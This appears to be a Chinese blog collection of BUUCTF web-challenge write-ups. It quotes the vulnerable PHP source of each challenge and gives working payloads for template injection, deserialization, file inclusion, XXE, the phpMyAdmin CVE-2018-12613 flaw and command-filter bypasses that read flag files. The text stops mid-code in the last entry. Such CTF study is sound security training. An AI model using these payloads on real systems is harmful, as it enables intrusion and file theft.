<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>Smarty是一个PHP的模板引擎</p>
<p>[(9条消息) <a href="https://blog.csdn.net/weixin_53150482/article/details/125750136">BJDCTF2020]The mystery of ip_2013040742 贾林彬的博客-CSDN博客</a></p>
<p>smart 模板注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if readfile(‘文件路劲’)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if show_source(‘文件路径’)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if passthru(‘操作命令’)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(‘操作命令’)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<p>将XFF改为<code>&#123;system(&#39;cat /flag&#39;)&#125;</code>即可得到flag</p>
<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>抓包看一眼</p>
<p><img src="/2023/05/13/buu%E5%90%88%E9%9B%86-buu2/QQ%E6%88%AA%E5%9B%BE20230515125322.png"></p>
<p>PHP date() 函数可把时间戳格式化为可读性更好的日期和时间。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo date(&quot;Y/m/d&quot;)；</span><br><span class="line">2016/10/21</span><br></pre></td></tr></table></figure>

<p>换用一下函数</p>
<p>func&#x3D;file_get_contents&amp;p&#x3D;index.php</p>
<p>看到源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line"> function gettime($func, $p) &#123;</span><br><span class="line">     $result = call_user_func($func, $p);</span><br><span class="line">     $a= gettype($result);</span><br><span class="line">     if ($a == &quot;string&quot;) &#123;</span><br><span class="line">         return $result;</span><br><span class="line">     &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> class Test &#123;</span><br><span class="line">     var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">     var $func = &quot;date&quot;;</span><br><span class="line">     function __destruct() &#123;</span><br><span class="line">         if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">             echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> $func = $_REQUEST[&quot;func&quot;];</span><br><span class="line"> $p = $_REQUEST[&quot;p&quot;];</span><br><span class="line"></span><br><span class="line"> if ($func != null) &#123;</span><br><span class="line">     $func = strtolower($func);</span><br><span class="line">     if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">         echo gettime($func, $p);</span><br><span class="line">     &#125;else &#123;</span><br><span class="line">         die(&quot;Hacker...&quot;);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>

<p>call_user_func函数类似于一种特别的调用函数的方法，使用方法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function nowamagic($a,$b)   </span><br><span class="line">&#123;   </span><br><span class="line">    echo $a;   </span><br><span class="line">    echo $b;   </span><br><span class="line">&#125;   </span><br><span class="line">call_user_func(&#x27;nowamagic&#x27;, &quot;111&quot;,&quot;222&quot;);   </span><br><span class="line">call_user_func(&#x27;nowamagic&#x27;, &quot;333&quot;,&quot;444&quot;);   </span><br><span class="line">//显示 111 222 333 444   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>反序列化绕过；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">    var $p = &quot;ls&quot;;</span><br><span class="line">    var $func = &quot;system&quot;;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">            echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new Test();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:10:&quot;cd /tmp;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:14:&quot;cd /tmp;cat f*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>伪协议读源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&#x27;category&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($file))</span><br><span class="line">&#123;</span><br><span class="line">    if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">        include ($file . &#x27;.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>strpos() f函数查找字符串在另一字符串中第一次出现的位置（区分大小写）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure>

<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>.git 泄露</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python GitHack.py http://760b4096-abac-4599-8173-10f22bf14fb6.node4.buuoj.cn/.git/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>payload；无参数RCE</p>
<p><a href="https://blog.csdn.net/Manuffer/article/details/120738755">(11条消息) 无参数RCE总结_L1am0ur的博客-CSDN博客</a></p>
<p>读取flag的位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>

<p>Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; .git [3] &#x3D;&gt; flag.php [4] &#x3D;&gt; index.php )</p>
<p>读取flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>方法二：</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exp=show_source(session_id(session_start()));，别忘了修改Cookie: PHPSESSID=flag.php</span><br></pre></td></tr></table></figure>

<h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>读取一下next.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">text=data:text/plain,I%20have%20a%20dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$_SESSION[&#x27;id&#x27;] = $id;</span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(&#x27;/(&#x27;.$re.&#x27;)/ei&#x27;,&#x27;strtolower(&quot;\\1&quot;)&#x27;,       $str);</span><br><span class="line">&#125;foreach($_GET as $re =&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;function getFlag()&#123;</span><br><span class="line">    @eval($_GET[&#x27;cmd&#x27;]);&#125;</span><br></pre></td></tr></table></figure>

<p><strong>preg_replace</strong> 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 <strong>preg_replace</strong> 函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为 <strong>‘strtolower(“\1”)’</strong> 字符串</p>
<p><a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行 - 先知社区 (aliyun.com)</a></p>
<p>解法一payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/next.php?\S*=$&#123;system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(97).chr(103))&#125;</span><br></pre></td></tr></table></figure>

<p>解法二payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>



<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p><strong>phpMyAdmin 4.8.1 远程文件包含</strong></p>
<p><a href="https://blog.csdn.net/weixin_44037296/article/details/111039461">phpMyAdmin 4.8.1 远程文件包含 CVE-2018-12613</a></p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure>

<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p> 题目既然已经提示xmL随便输入123，123，抓包看看</p>
<p><img src="/2023/05/13/buu%E5%90%88%E9%9B%86-buu2/QQ%E6%88%AA%E5%9B%BE20230516121956.png"></p>
<p><a href="https://www.freebuf.com/vuls/175451.html">浅谈XML实体注入漏洞 - FreeBuf网络安全行业门户</a></p>
<p><img src="/2023/05/13/buu%E5%90%88%E9%9B%86-buu2/QQ%E6%88%AA%E5%9B%BE20230516122544.png"></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user</span><br></pre></td></tr></table></figure>

<h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>抓包后看到fl4g.php</p>
<p>访问一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>第一个绕过</p>
<p>PHP str_ireplace() 函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)</span><br></pre></td></tr></table></figure>

<p>16进制科学计数法，还有很多方法，</p>
<p>num&#x3D;0x9e9</p>
<p>第二层加密后相等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0e215962017</span><br></pre></td></tr></table></figure>

<p>把字符串 “Hello world!” 中的字符 “WORLD”（不区分大小写）替换成 “Shanghai”：</p>
<p>PHP strstr() 函数</p>
<p>查找 “Shanghai” 在 “I love Shanghai!” 中的第一次出现，并返回字符串的剩余部分：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo strstr(&quot;I love Shanghai!&quot;,&quot;Shanghai&quot;);</span><br><span class="line">结果</span><br><span class="line">Shanghai!</span><br></pre></td></tr></table></figure>

<p>第三层</p>
<p>if(!strstr($get_flag,” “))&#x2F;&#x2F;无空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;IFS&#125; %09 等空格绕过即可</span><br></pre></td></tr></table></figure>

<p>这道题不难，出现在这个位置不理解</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=0x9e9&amp;md5=0e215962017&amp;get_flag=ls</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=0x9e9&amp;md5=0e215962017&amp;get_flag=tac%09flll*</span><br></pre></td></tr></table></figure>

<h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;</p>
<p>观察url 随波逐流解不出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">echo (base64_decode(&#x27;MzUzNTM1MmU3MDZlNjc=&#x27;));</span><br></pre></td></tr></table></figure>

<p>两次，再hex 16进制解密</p>
<p>得到555.php，同样加密hou</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=</span><br></pre></td></tr></table></figure>

<p>打开查看源码</p>
<p>base解码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#x27;content-type:text/html;charset=utf-8&#x27;);$cmd = $_GET[&#x27;cmd&#x27;];if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;]))     header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) &#123;    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;    die(&quot;xixi～ no flag&quot;);&#125; else &#123;    $txt = base64_encode(file_get_contents($file));    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;    echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;    echo(&quot;forbid ~&quot;);    echo &quot;&lt;br&gt;&quot;;&#125; else &#123;    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;        echo `$cmd`;    &#125; else &#123;        echo (&quot;md5 is funny ~&quot;);    &#125;&#125;?&gt;&lt;html&gt;&lt;style&gt;  body&#123;   background:url(./bj.png)  no-repeat center center;   background-size:cover;   background-attachment:fixed;   background-color:#CCCCCC;&#125;&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>抓包flag.php的包</p>
<p>。<a href="https://so.csdn.net/so/search?q=SSTI&spm=1001.2101.3001.7020">SSTI</a>里面的Twig攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入&#123;&#123;7*‘7’&#125;&#125;，返回49表示是 Twig 模块</span><br><span class="line">输入&#123;&#123;7*‘7’&#125;&#125;，返回7777777表示是 Jinja2 模块</span><br></pre></td></tr></table></figure>

<p>cookie改为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=c8cde75f12c03656af33c984478d1870; user=&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;tac /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="安洵杯-2019-easy-serialize-php未写"><a href="#安洵杯-2019-easy-serialize-php未写" class="headerlink" title="[安洵杯 2019]easy_serialize_php未写"></a>[安洵杯 2019]easy_serialize_php未写</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;<span class="comment">//函数作用将敏感字符串替换成字符</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line"> 